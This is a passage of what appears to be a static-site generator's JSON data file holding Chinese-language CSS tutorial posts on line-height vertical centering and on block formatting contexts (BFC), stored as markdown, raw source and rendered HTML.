实际应用：</h2><h3 id=\"实现图片水平垂直居中\"><a href=\"#实现图片水平垂直居中\" class=\"headerlink\" title=\"实现图片水平垂直居中:\"></a>实现图片水平垂直居中:</h3><p>例如： </p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"box\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"line-height: 500px;text-align: center;background: #000;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"1.png\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"vertical-align: middle;\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>实际效果：</p>\n<p><img src=\"/assets/2016-03-16-css-line-height/12.png\" alt=\"\"></p>\n<h3 id=\"实现多行文本垂直居中\"><a href=\"#实现多行文本垂直居中\" class=\"headerlink\" title=\"实现多行文本垂直居中\"></a>实现多行文本垂直居中</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width:150px;height:100px;line-height:100px;background-color:#ccc;font-size:0;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"display:inline-block;font-size:20px;line-height:1.4em;vertical-align:middle;\"</span>&gt;</span></span><br><span class=\"line\">        This is a test.<span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></span><br><span class=\"line\">        This is a test.</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>效果：  </p>\n<p><img src=\"/assets/2016-03-16-css-line-height/13.png\" alt=\"\"></p>\n<p>关键点: </p>\n<ul>\n<li>父类 font-size 大小要设为 0，不然会存在垂直偏移</li>\n<li>子类 inline-block 化</li>\n</ul>\n<h3 id=\"单行文本垂直居中\"><a href=\"#单行文本垂直居中\" class=\"headerlink\" title=\"单行文本垂直居中\"></a>单行文本垂直居中</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"line-height:100px;border:dashed 1px #0e0;\"</span>&gt;</span> </span><br><span class=\"line\">\tThis is a test.</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-16-css-line-height/14.png\" alt=\"\"></p>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"http://www.imooc.com/learn/403\">CSS深入理解之line-height</a></li>\n<li><a href=\"http://www.cnblogs.com/dolphinX/p/3236686.html\">CSS行高——line-height</a></li>\n</ul>\n"},{"layout":"post","title":"CSS - 深入理解 BFC","date":"2016-03-17T04:00:00.000Z","author":"Lindz","header-img":"img/15.jpg","_content":"\n## 一、常见定位方案\n\n在讲 BFC 之前，我们先来了解一下常见的定位方案，定位方案是控制元素的布局，有三种常见方案:\n\n普通流 (normal flow)\n\n> 在普通流中，元素按照其在 HTML 中的先后位置至上而下布局，在这个过程中，行内元素水平排列，直到当行被占满然后换行，块级元素则会被渲染为完整的一个新行，除非另外指定，否则所有元素默认都是普通流定位，也可以说，普通流中元素的位置由该元素在 HTML 文档中的位置决定。\n\n浮动 (float)\n\n> 在浮动布局中，元素首先按照普通流的位置出现，然后根据浮动的方向尽可能的向左边或右边偏移，其效果与印刷排版中的文本环绕相似。\n\n绝对定位 (absolute positioning)\n\n> 在绝对定位布局中，元素会整体脱离普通流，因此绝对定位元素不会对其兄弟元素造成影响，而元素具体的位置由绝对定位的坐标决定。\n\n## 二、BFC 概念\n\n那么 BFC 是什么呢？\n\nBFC 即 Block Formatting Contexts (块级格式化上下文)，它属于上述定位方案的普通流\n\n**具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器没有的一些特性。**\n\n**不过只有 Block-level Box 可以参与创建 BFC**， 它规定了内部的 Block-level Box 如何布局，并且与这个独立盒子里的布局不受外部影响，当然它也不会影响到外面的元素。\n\nFormatting context 是 W3C CSS2.1 规范中的一个概念。它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。\n\n最常见的 Formatting context 有 Block fomatting context (简称 BFC)和 Inline formatting context (简称IFC)。CSS2.1 中只有 BFC 和 IFC, CSS3 中还增加了 GFC 和 FFC.\n\n## 三、触发 BFC\n\n只要元素满足下面任一条件即可触发 BFC 特性：\n\n* body 根元素\n* 浮动元素：float 除 none 以外的值\n* 绝对定位元素：position (absolute、fixed)\n* display 为 inline-block、table-cells、flex\n* overflow 除了 visible 以外的值 (hidden、auto、scroll)\n\n## 四、BFC 特性及应用\n\n### 1.同一个 BFC 下外边距会发生折叠\n\n```css\n<head>\ndiv{\n    width: 100px;\n    height: 100px;\n    background: lightblue;\n    margin: 100px;\n}\n</head>\n<body>\n\t<div></div>\n\t<div></div>\n</body>\n```\n\n![](/assets/2016-03-17-css-bfc/1.png)\n\n从效果上看，因为两个 div 元素都处于同一个 BFC 容器下 (这里指 body 元素) 所以第一个 div 的下边距和第二个 div 的上边距发生了重叠，所以两个盒子之间距离只有 100px，而不是 200px\n\n首先这不是 CSS 的 bug，我们可以理解为一种规范，**如果想要避免外边距的重叠，可以将其放在不同的 BFC 容器中。**\n\n```html\n<div class=\"container\">\n    <p></p>\n</div>\n<p></p>\n```\n\n```css\n.container {\n    overflow: hidden;\n}\np {\n    width: 100px;\n    height: 100px;\n    background: lightblue;\n    margin: 100px;\n}\n```\n\n这时候，两个盒子边距就变成了 200px \n\n![](/assets/2016-03-17-css-bfc/2.png)\n\n### 2. BFC 可以包含浮动的元素（清除浮动）\n\n我们都知道，浮动的元素会脱离普通文档流，来看下下面一个例子\n\n```html\n<div style=\"border: 1px solid #000;\">\n    <div style=\"width: 100px;height: 100px;background: #eee;float: left;\"></div>\n</div>\n```\n\n![](/assets/2016-03-17-css-bfc/3.png)\n\n**由于容器内元素浮动，脱离了文档流，所以容器只剩下 2px 的边距高度。如果使触发容器的 BFC，那么容器将会包裹着浮动元素。**\n\n```html\n<div style=\"border: 1px solid #000;overflow: hidden\">\n    <div style=\"width: 100px;height: 100px;background: #eee;float: left;\"></div>\n</div>\n```\n\n效果：\n\n![](/assets/2016-03-17-css-bfc/4.png)\n\n### 3. BFC 可以阻止元素被浮动元素覆盖\n\n先来看一个文字环绕效果：\n\n```html\n<div style=\"height: 100px;width: 100px;float: left;background: lightblue\">我是一个左浮动的元素</div>\n<div style=\"width: 200px; height: 200px;background: #eee\">我是一个没有设置浮动, \n也没有触发 BFC 元素, width: 200px; height:200px; background: #eee;</div>\n```\n\n效果：\n\n![](/assets/2016-03-17-css-bfc/5.png)\n\n这时候其实第二个元素有部分被浮动元素所覆盖，(但是文本信息不会被浮动元素所覆盖) 如果想避免元素被覆盖，可触第二个元素的 BFC 特性，在第二个元素中加入 ```overflow: hidden;```，就会变成：\n\n![](/assets/2016-03-17-css-bfc/6.png)\n\n**这个方法可以用来实现两列自适应布局，效果不错，推荐写法：**\n\n```css\n.cell{\n\tdisplay: table-cell;   //IE 8+ BFC 特性\n\twidth: 2000px;\n\t*display: inline-block;  //css hack IE 7- 伪 BFC 特性\n\t*width: auto;\n}\n```\n\n注: 不用 overflow：hidden 是因为其副作用明显，无法广泛应用\n\n参考链接:\n\n* [CSS深入理解流体特性和BFC特性下多栏自适应布局](http://www.zhangxinxu.com/wordpress/2015/02/css-deep-understand-flow-bfc-column-two-auto-layout/)\n* [详说 Block Formatting Contexts (块级格式化上下文)](http://kayosite.com/block-formatting-contexts-in-detail.html)\n\n\n","source":"_posts/2016-03-17-css-bfc.md","raw":"---\nlayout:     post\ntitle:      \"CSS - 深入理解 BFC\"\ndate:       2016-03-17 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/15.jpg\"\ntags:\n    - CSS\n---\n\n## 一、常见定位方案\n\n在讲 BFC 之前，我们先来了解一下常见的定位方案，定位方案是控制元素的布局，有三种常见方案:\n\n普通流 (normal flow)\n\n> 在普通流中，元素按照其在 HTML 中的先后位置至上而下布局，在这个过程中，行内元素水平排列，直到当行被占满然后换行，块级元素则会被渲染为完整的一个新行，除非另外指定，否则所有元素默认都是普通流定位，也可以说，普通流中元素的位置由该元素在 HTML 文档中的位置决定。\n\n浮动 (float)\n\n> 在浮动布局中，元素首先按照普通流的位置出现，然后根据浮动的方向尽可能的向左边或右边偏移，其效果与印刷排版中的文本环绕相似。\n\n绝对定位 (absolute positioning)\n\n> 在绝对定位布局中，元素会整体脱离普通流，因此绝对定位元素不会对其兄弟元素造成影响，而元素具体的位置由绝对定位的坐标决定。\n\n## 二、BFC 概念\n\n那么 BFC 是什么呢？\n\nBFC 即 Block Formatting Contexts (块级格式化上下文)，它属于上述定位方案的普通流\n\n**具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器没有的一些特性。**\n\n**不过只有 Block-level Box 可以参与创建 BFC**， 它规定了内部的 Block-level Box 如何布局，并且与这个独立盒子里的布局不受外部影响，当然它也不会影响到外面的元素。\n\nFormatting context 是 W3C CSS2.1 规范中的一个概念。它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。\n\n最常见的 Formatting context 有 Block fomatting context (简称 BFC)和 Inline formatting context (简称IFC)。CSS2.1 中只有 BFC 和 IFC, CSS3 中还增加了 GFC 和 FFC.\n\n## 三、触发 BFC\n\n只要元素满足下面任一条件即可触发 BFC 特性：\n\n* body 根元素\n* 浮动元素：float 除 none 以外的值\n* 绝对定位元素：position (absolute、fixed)\n* display 为 inline-block、table-cells、flex\n* overflow 除了 visible 以外的值 (hidden、auto、scroll)\n\n## 四、BFC 特性及应用\n\n### 1.同一个 BFC 下外边距会发生折叠\n\n```css\n<head>\ndiv{\n    width: 100px;\n    height: 100px;\n    background: lightblue;\n    margin: 100px;\n}\n</head>\n<body>\n\t<div></div>\n\t<div></div>\n</body>\n```\n\n![](/assets/2016-03-17-css-bfc/1.png)\n\n从效果上看，因为两个 div 元素都处于同一个 BFC 容器下 (这里指 body 元素) 所以第一个 div 的下边距和第二个 div 的上边距发生了重叠，所以两个盒子之间距离只有 100px，而不是 200px\n\n首先这不是 CSS 的 bug，我们可以理解为一种规范，**如果想要避免外边距的重叠，可以将其放在不同的 BFC 容器中。**\n\n```html\n<div class=\"container\">\n    <p></p>\n</div>\n<p></p>\n```\n\n```css\n.container {\n    overflow: hidden;\n}\np {\n    width: 100px;\n    height: 100px;\n    background: lightblue;\n    margin: 100px;\n}\n```\n\n这时候，两个盒子边距就变成了 200px \n\n![](/assets/2016-03-17-css-bfc/2.png)\n\n### 2. BFC 可以包含浮动的元素（清除浮动）\n\n我们都知道，浮动的元素会脱离普通文档流，来看下下面一个例子\n\n```html\n<div style=\"border: 1px solid #000;\">\n    <div style=\"width: 100px;height: 100px;background: #eee;float: left;\"></div>\n</div>\n```\n\n![](/assets/2016-03-17-css-bfc/3.png)\n\n**由于容器内元素浮动，脱离了文档流，所以容器只剩下 2px 的边距高度。如果使触发容器的 BFC，那么容器将会包裹着浮动元素。**\n\n```html\n<div style=\"border: 1px solid #000;overflow: hidden\">\n    <div style=\"width: 100px;height: 100px;background: #eee;float: left;\"></div>\n</div>\n```\n\n效果：\n\n![](/assets/2016-03-17-css-bfc/4.png)\n\n### 3. BFC 可以阻止元素被浮动元素覆盖\n\n先来看一个文字环绕效果：\n\n```html\n<div style=\"height: 100px;width: 100px;float: left;background: lightblue\">我是一个左浮动的元素</div>\n<div style=\"width: 200px; height: 200px;background: #eee\">我是一个没有设置浮动, \n也没有触发 BFC 元素, width: 200px; height:200px; background: #eee;</div>\n```\n\n效果：\n\n![](/assets/2016-03-17-css-bfc/5.png)\n\n这时候其实第二个元素有部分被浮动元素所覆盖，(但是文本信息不会被浮动元素所覆盖) 如果想避免元素被覆盖，可触第二个元素的 BFC 特性，在第二个元素中加入 ```overflow: hidden;```，就会变成：\n\n![](/assets/2016-03-17-css-bfc/6.png)\n\n**这个方法可以用来实现两列自适应布局，效果不错，推荐写法：**\n\n```css\n.cell{\n\tdisplay: table-cell;   //IE 8+ BFC 特性\n\twidth: 2000px;\n\t*display: inline-block;  //css hack IE 7- 伪 BFC 特性\n\t*width: auto;\n}\n```\n\n注: 不用 overflow：hidden 是因为其副作用明显，无法广泛应用\n\n参考链接:\n\n* [CSS深入理解流体特性和BFC特性下多栏自适应布局](http://www.zhangxinxu.com/wordpress/2015/02/css-deep-understand-flow-bfc-column-two-auto-layout/)\n* [详说 Block Formatting Contexts (块级格式化上下文)](http://kayosite.com/block-formatting-contexts-in-detail.html)\n\n\n","slug":"2016-03-17-css-bfc","published":1,"updated":"2016-03-17T12:53:20.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6ryg000txmvdfgt77tl2","content":"<h2 id=\"一、常见定位方案\"><a href=\"#一、常见定位方案\" class=\"headerlink\" title=\"一、常见定位方案\"></a>一、常见定位方案</h2><p>在讲 BFC 之前，我们先来了解一下常见的定位方案，定位方案是控制元素的布局，有三种常见方案:</p>\n<p>普通流 (normal flow)</p>\n<blockquote>\n<p>在普通流中，元素按照其在 HTML 中的先后位置至上而下布局，在这个过程中，行内元素水平排列，直到当行被占满然后换行，块级元素则会被渲染为完整的一个新行，除非另外指定，否则所有元素默认都是普通流定位，也可以说，普通流中元素的位置由该元素在 HTML 文档中的位置决定。</p>\n</blockquote>\n<p>浮动 (float)</p>\n<blockquote>\n<p>在浮动布局中，元素首先按照普通流的位置出现，然后根据浮动的方向尽可能的向左边或右边偏移，其效果与印刷排版中的文本环绕相似。</p>\n</blockquote>\n<p>绝对定位 (absolute positioning)</p>\n<blockquote>\n<p>在绝对定位布局中，元素会整体脱离普通流，因此绝对定位元素不会对其兄弟元素造成影响，而元素具体的位置由绝对定位的坐标决定。</p>\n</blockquote>\n<h2 id=\"二、BFC-概念\"><a href=\"#二、BFC-概念\" class=\"headerlink\" title=\"二、BFC 概念\"></a>二、BFC 概念</h2><p>那么 BFC 是什么呢？</p>\n<p>BFC 即 Block Formatting Contexts (块级格式化上下文)，它属于上述定位方案的普通流</p>\n<p><strong>具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器没有的一些特性。</strong></p>\n<p><strong>不过只有 Block-level Box 可以参与创建 BFC</strong>， 它规定了内部的 Block-level Box 如何布局，并且与这个独立盒子里的布局不受外部影响，当然它也不会影响到外面的元素。</p>\n<p>Formatting context 是 W3C CSS2.1 规范中的一个概念。它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。</p>\n<p>最常见的 Formatting context 有 Block fomatting context (简称 BFC)和 Inline formatting context (简称IFC)。CSS2.1 中只有 BFC 和 IFC, CSS3 中还增加了 GFC 和 FFC.</p>\n<h2 id=\"三、触发-BFC\"><a href=\"#三、触发-BFC\" class=\"headerlink\" title=\"三、触发 BFC\"></a>三、触发 BFC</h2><p>只要元素满足下面任一条件即可触发 BFC 特性：</p>\n<ul>\n<li>body 根元素</li>\n<li>浮动元素：float 除 none 以外的值</li>\n<li>绝对定位元素：position (absolute、fixed)</li>\n<li>display 为 inline-block、table-cells、flex</li>\n<li>overflow 除了 visible 以外的值 (hidden、auto、scroll)</li>\n</ul>\n<h2 id=\"四、BFC-特性及应用\"><a href=\"#四、BFC-特性及应用\" class=\"headerlink\" title=\"四、BFC 特性及应用\"></a>四、BFC 特性及应用</h2><h3 id=\"1-同一个-BFC-下外边距会发生折叠\"><a href=\"#1-同一个-BFC-下外边距会发生折叠\" class=\"headerlink\" title=\"1.同一个 BFC 下外边距会发生折叠\"></a>1.同一个 BFC 下外边距会发生折叠</h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">div&#123;</span><br><span class=\"line\">    width: 100px;</span><br><span class=\"line\">    height: 100px;</span><br><span class=\"line\">    background: lightblue;</span><br><span class=\"line\">    margin: 100px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;div&gt;&lt;/div&gt;</span><br><span class=\"line\">\t&lt;div&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/2016-03-17-css-bfc/1.png\" alt=\"\"></p>\n<p>从效果上看，因为两个 div 元素都处于同一个 BFC 容器下 (这里指 body 元素) 所以第一个 div 的下边距和第二个 div 的上边距发生了重叠，所以两个盒子之间距离只有 100px，而不是 200px</p>\n<p>首先这不是 CSS 的 bug，我们可以理解为一种规范，<strong>如果想要避免外边距的重叠，可以将其放在不同的 BFC 容器中。</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">p</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: lightblue;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这时候，两个盒子边距就变成了 200px </p>\n<p><img src=\"/assets/2016-03-17-css-bfc/2.png\" alt=\"\"></p>\n<h3 id=\"2-BFC-可以包含浮动的元素（清除浮动）\"><a href=\"#2-BFC-可以包含浮动的元素（清除浮动）\" class=\"headerlink\" title=\"2. BFC 可以包含浮动的元素（清除浮动）\"></a>2. BFC 可以包含浮动的元素（清除浮动）</h3><p>我们都知道，浮动的元素会脱离普通文档流，来看下下面一个例子</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"border: 1px solid #000;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 100px;height: 100px;background: #eee;float: left;\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/2016-03-17-css-bfc/3.png\" alt=\"\"></p>\n<p><strong>由于容器内元素浮动，脱离了文档流，所以容器只剩下 2px 的边距高度。如果使触发容器的 BFC，那么容器将会包裹着浮动元素。</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"border: 1px solid #000;overflow: hidden\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 100px;height: 100px;background: #eee;float: left;\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-17-css-bfc/4.png\" alt=\"\"></p>\n<h3 id=\"3-BFC-可以阻止元素被浮动元素覆盖\"><a href=\"#3-BFC-可以阻止元素被浮动元素覆盖\" class=\"headerlink\" title=\"3. BFC 可以阻止元素被浮动元素覆盖\"></a>3. BFC 可以阻止元素被浮动元素覆盖</h3><p>先来看一个文字环绕效果：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"height: 100px;width: 100px;float: left;background: lightblue\"</span>&gt;</span>我是一个左浮动的元素<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 200px; height: 200px;background: #eee\"</span>&gt;</span>我是一个没有设置浮动, </span><br><span class=\"line\">也没有触发 BFC 元素, width: 200px; height:200px; background: #eee;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-17-css-bfc/5.png\" alt=\"\"></p>\n<p>这时候其实第二个元素有部分被浮动元素所覆盖，(但是文本信息不会被浮动元素所覆盖) 如果想避免元素被覆盖，可触第二个元素的 BFC 特性，在第二个元素中加入 <figure class=\"highlight plain\"><figcaption><span>hidden;```，就会变成：</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">![](/assets/2016-03-17-css-bfc/6.png)</span><br><span class=\"line\"></span><br><span class=\"line\">**这个方法可以用来实现两列自适应布局，效果不错，推荐写法：**</span><br><span class=\"line\"></span><br><span class=\"line\">```css</span><br><span class=\"line\">.cell&#123;</span><br><span class=\"line\">\tdisplay: table-cell;   //IE 8+ BFC 特性</span><br><span class=\"line\">\twidth: 2000px;</span><br><span class=\"line\">\t*display: inline-block;  //css hack IE 7- 伪 BFC 特性</span><br><span class=\"line\">\t*width: auto;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>注: 不用 overflow：hidden 是因为其副作用明显，无法广泛应用</p>\n<p>参考链接:</p>\n<ul>\n<li><a href=\"http://www.zhangxinxu.com/wordpress/2015/02/css-deep-understand-flow-bfc-column-two-auto-layout/\" target=\"_blank\" rel=\"external\">CSS深入理解流体特性和BFC特性下多栏自适应布局</a></li>\n<li><a href=\"http://kayosite.com/block-formatting-contexts-in-detail.html\" target=\"_blank\" rel=\"external\">详说 Block Formatting Contexts (块级格式化上下文)</a></li>\n</ul>\n","excerpt":"","more":"<h2 id=\"一、常见定位方案\"><a href=\"#一、常见定位方案\" class=\"headerlink\" title=\"一、常见定位方案\"></a>一、常见定位方案</h2><p>在讲 BFC 之前，我们先来了解一下常见的定位方案，定位方案是控制元素的布局，有三种常见方案:</p>\n<p>普通流 (normal flow)</p>\n<blockquote>\n<p>在普通流中，元素按照其在 HTML 中的先后位置至上而下布局，在这个过程中，行内元素水平排列，直到当行被占满然后换行，块级元素则会被渲染为完整的一个新行，除非另外指定，否则所有元素默认都是普通流定位，也可以说，普通流中元素的位置由该元素在 HTML 文档中的位置决定。</p>\n</blockquote>\n<p>浮动 (float)</p>\n<blockquote>\n<p>在浮动布局中，元素首先按照普通流的位置出现，然后根据浮动的方向尽可能的向左边或右边偏移，其效果与印刷排版中的文本环绕相似。</p>\n</blockquote>\n<p>绝对定位 (absolute positioning)</p>\n<blockquote>\n<p>在绝对定位布局中，元素会整体脱离普通流，因此绝对定位元素不会对其兄弟元素造成影响，而元素具体的位置由绝对定位的坐标决定。</p>\n</blockquote>\n<h2 id=\"二、BFC-概念\"><a href=\"#二、BFC-概念\" class=\"headerlink\" title=\"二、BFC 概念\"></a>二、BFC 概念</h2><p>那么 BFC 是什么呢？</p>\n<p>BFC 即 Block Formatting Contexts (块级格式化上下文)，它属于上述定位方案的普通流</p>\n<p><strong>具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器没有的一些特性。</strong></p>\n<p><strong>不过只有 Block-level Box 可以参与创建 BFC</strong>， 它规定了内部的 Block-level Box 如何布局，并且与这个独立盒子里的布局不受外部影响，当然它也不会影响到外面的元素。</p>\n<p>Formatting context 是 W3C CSS2.1 规范中的一个概念。它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。</p>\n<p>最常见的 Formatting context 有 Block fomatting context (简称 BFC)和 Inline formatting context (简称IFC)。CSS2.1 中只有 BFC 和 IFC, CSS3 中还增加了 GFC 和 FFC.</p>\n<h2 id=\"三、触发-BFC\"><a href=\"#三、触发-BFC\" class=\"headerlink\" title=\"三、触发 BFC\"></a>三、触发 BFC</h2><p>只要元素满足下面任一条件即可触发 BFC 特性：</p>\n<ul>\n<li>body 根元素</li>\n<li>浮动元素：float 除 none 以外的值</li>\n<li>绝对定位元素：position (absolute、fixed)</li>\n<li>display 为 inline-block、table-cells、flex</li>\n<li>overflow 除了 visible 以外的值 (hidden、auto、scroll)</li>\n</ul>\n<h2 id=\"四、BFC-特性及应用\"><a href=\"#四、BFC-特性及应用\" class=\"headerlink\" title=\"四、BFC 特性及应用\"></a>四、BFC 特性及应用</h2><h3 id=\"1-同一个-BFC-下外边距会发生折叠\"><a href=\"#1-同一个-BFC-下外边距会发生折叠\" class=\"headerlink\" title=\"1.同一个 BFC 下外边距会发生折叠\"></a>1.同一个 BFC 下外边距会发生折叠</h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">div&#123;</span><br><span class=\"line\">    width: 100px;</span><br><span class=\"line\">    height: 100px;</span><br><span class=\"line\">    background: lightblue;</span><br><span class=\"line\">    margin: 100px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;div&gt;&lt;/div&gt;</span><br><span class=\"line\">\t&lt;div&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/2016-03-17-css-bfc/1.png\" alt=\"\"></p>\n<p>从效果上看，因为两个 div 元素都处于同一个 BFC 容器下 (这里指 body 元素) 所以第一个 div 的下边距和第二个 div 的上边距发生了重叠，所以两个盒子之间距离只有 100px，而不是 200px</p>\n<p>首先这不是 CSS 的 